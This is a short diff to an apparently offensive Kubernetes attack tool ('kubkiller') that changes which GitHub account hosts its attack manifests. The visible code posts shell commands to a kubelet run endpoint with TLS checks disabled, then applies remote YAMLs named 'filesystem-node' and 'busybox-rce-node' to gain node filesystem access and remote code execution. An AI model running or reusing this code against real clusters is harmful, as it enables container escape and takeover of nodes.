@@ -2,7 +2,7 @@ import requests, pty
 
 def pod_deploy(hostFull, pod, namespace, container, id, pod_id):
     
-    pods_deploy = {1:"./tmp/kubectl apply -f https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"./tmp/kubectl apply -f https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}
+    pods_deploy = {1:"./tmp/kubectl apply -f https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/filesystem-node.yml", 2:"./tmp/kubectl apply -f https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/busybox-rce-node.yml"}
 
     wget_verify = requests.post(hostFull + "/run/" + namespace[pod_id-1] + "/" + pod[pod_id-1] + "/" + container[pod_id-1], data={"cmd":"wget -h"}, verify=False)
     wget_verify_bytes = wget_verify.content
@@ -39,7 +39,7 @@ def pod_deploy(hostFull, pod, namespace, container, id, pod_id):
             print("--- NOT POSSIBLE CREATE A " + id + " POD ---")
 
 def pod_deploy_api(hostFull, pod_id):
-    pods_deploy = {1:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}
+    pods_deploy = {1:"https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/busybox-rce-node.yml"}
 
     print("+++ May be possible to install a busybox pod +++")
 
@@ -88,7 +88,7 @@ def pod_delete_api(hostFull, ns, pod_name):
     print()
 
 def pod_deploy_service(host, serviceaccount, ns, id):
-    pods_deploy = {1:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/abneralcantara/kubkiller/main/YAMLs/busybox-rce-node.yml"}
+    pods_deploy = {1:"https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/filesystem-node.yml", 2:"https://raw.githubusercontent.com/ech0png/kubkiller/main/YAMLs/busybox-rce-node.yml"}
 
     print("+++ May be possible to install a busybox pod +++")
 
